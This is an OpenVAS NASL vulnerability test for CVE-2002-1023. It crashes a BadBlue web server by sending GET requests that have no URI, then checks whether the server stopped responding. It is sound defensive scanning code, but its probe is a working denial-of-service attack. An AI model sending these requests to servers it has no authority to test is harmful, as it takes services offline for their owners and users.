# OpenVAS Vulnerability Test
# $Id: badblue_get_DoS.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: BadBlue invalid GET DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid GET request (without any URI)

A cracker may exploit this vulnerability to make your web server
crash continually.

Workaround : upgrade your software or protect it with a filtering reverse proxy";

# *untested*
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN

if(description)
{
 script_id(11062);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5187);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2002-1023");
 name = "BadBlue invalid GET DoS";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########


include("http_func.inc");

r1 = string("GET HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n\r\n");
r2 = string("GET  HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n\r\n");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if(http_is_dead(port: port)) exit (0);

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: r1);
r = http_recv(socket:soc);
close(soc);

sleep(1);

soc = http_open_socket(port);
if(!soc) { security_message(port); exit(0); }
send(socket:soc, data: r2);
r = http_recv(socket:soc);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port: port)) { security_message(port); }
